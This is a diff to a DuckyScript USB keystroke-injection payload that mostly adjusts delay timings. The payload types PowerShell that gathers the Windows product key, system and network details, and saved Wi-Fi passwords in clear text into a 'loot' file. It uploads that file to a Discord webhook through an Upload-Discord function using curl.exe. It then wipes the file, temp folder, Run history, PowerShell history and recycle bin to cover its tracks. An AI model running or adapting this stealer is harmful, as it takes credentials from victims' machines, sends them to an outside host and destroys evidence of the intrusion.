@@ -19,133 +19,133 @@ DELAY 200
 ENTER
 DELAY 200
 STRING Get-CimInstance -ClassName SoftwareLicensingService | Select-Object -ExpandProperty OA3xOriginalProductKey | Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 5000
-ENTER
 DELAY 2000
+ENTER
+DELAY 1000
 STRING Get-CimInstance -ClassName Win32_ComputerSystem | Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING systeminfo | Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING Get-DnsClient | Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING Get-ComputerInfo | Out-File C:\Users\Public\loot.txt -Force -append
 DELAY 2000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3" | Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING Get-CimInstance -ClassName Win32_BIOS | Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING Get-CimInstance -ClassName Win32_Processor | Select-Object -ExcludeProperty "CIM*" | Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING function Upload-Discord {
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING [CmdletBinding()]
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING param (
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING [parameter(Position=0,Mandatory=$False)]
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING [string]$file,
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING [parameter(Position=1,Mandatory=$False)]
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING [string]$text 
-DELAY 2000
+DELAY 21000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING )
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING $hookurl = 'YOUR DISCORD WEBHOOK HERE'
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING $Body = @{
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING 'username' = $env:"YOUR DISCORD USERNAME HERE"
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING 'content' = $text
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING }
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING if (-not ([string]::IsNullOrEmpty($text))){
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body |  ConvertTo-Json)};
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING curl.exe -F "file1=@$file" $hookurl
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING }
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING Upload-Discord -file "C:\Users\Public\loot.txt"
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING Remove-Item "C:\Users\Public\loot.txt"
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING Remove-Item (Get-PSreadlineOption).HistorySavePath
-DELAY 2000
+DELAY 1000
 ENTER
-DELAY 2000
+DELAY 1000
 STRING Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 DELAY 200
 ENTER
